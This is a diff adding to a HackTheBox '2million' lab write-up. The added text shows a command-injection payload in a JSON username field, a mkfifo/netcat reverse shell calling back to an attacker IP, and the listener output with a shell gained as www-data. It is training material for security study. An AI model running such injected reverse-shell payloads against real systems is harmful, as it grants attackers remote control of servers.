@@ -151,7 +151,30 @@ Below response shows the ovpn file. This is using `cat` command to view the file
 
 # Exploitation
 
-Inserting `a; ls #` payload to `username` parameter to perform command injection exploit.
+Inserting `a; ls #` payload to `username` parameter to check command injection exploit possibility. Below response shows that the server is vulnerable to command injection.
 
 ![](Pasted%20image%2020241201143342.png)
+
+By exploiting command injection we can achieve remote code execution using below payload.
+
+```
+{
+	"username":"a; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.15 9999 >/tmp/f #"
+}
+```
+
+![](Pasted%20image%2020241201155429.png)
+
+```
+┌──[hexadivine@hackthebox]─[~]
+└──╼ $ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.16.15] from (UNKNOWN) [10.10.11.221] 51692
+bash: cannot set terminal process group (1171): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@2million:~/html$ 
+```
 
